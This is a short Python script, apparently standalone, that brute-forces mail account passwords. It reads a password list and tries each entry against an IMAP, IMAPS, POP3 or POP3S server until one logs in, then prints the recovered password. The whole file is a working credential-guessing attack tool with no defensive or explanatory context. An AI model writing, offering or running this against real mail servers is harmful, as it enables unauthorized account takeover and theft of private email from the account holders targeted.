import imaplib
import poplib

# Prompt user for server address, username, and password list file
protocol = input("Enter protocol (IMAP, IMAPS, POP3, or POP3S): ")
server_address = input("Enter server address: ")
username = input("Enter username: ")
password_file = input("Enter password list file: ")

# Open password list file and read passwords
with open(password_file, "r") as f:
    passwords = f.read().splitlines()

# Attempt to authenticate with server using passwords in list
num_requests = 0
for password in passwords:
    try:
        if protocol.lower() == "imap":
            # Connect to IMAP server and attempt to login with username and password
            imap_server = imaplib.IMAP4(server_address)
            imap_server.login(username, password)
            imap_server.logout()
        elif protocol.lower() == "imaps":
            # Connect to IMAPS server and attempt to login with username and password
            imap_server = imaplib.IMAP4_SSL(server_address)
            imap_server.login(username, password)
            imap_server.logout()
        elif protocol.lower() == "pop3":
            # Connect to POP3 server and attempt to login with username and password
            pop_server = poplib.POP3(server_address)
            pop_server.user(username)
            pop_server.pass_(password)
            pop_server.quit()
        elif protocol.lower() == "pop3s":
            # Connect to POP3S server and attempt to login with username and password
            pop_server = poplib.POP3_SSL(server_address)
            pop_server.user(username)
            pop_server.pass_(password)
            pop_server.quit()
        else:
            print("Invalid protocol specified!")
            break
        
        # If login is successful, print password and exit loop
        print("Login successful! Password is: ", password)
        break
    except Exception as e:
        # If login fails, continue to next password
        num_requests += 1
        print("Failed attempt with password: ", password)
        print("Error message: ", str(e))
        continue

print("Total number of requests made: ", num_requests)
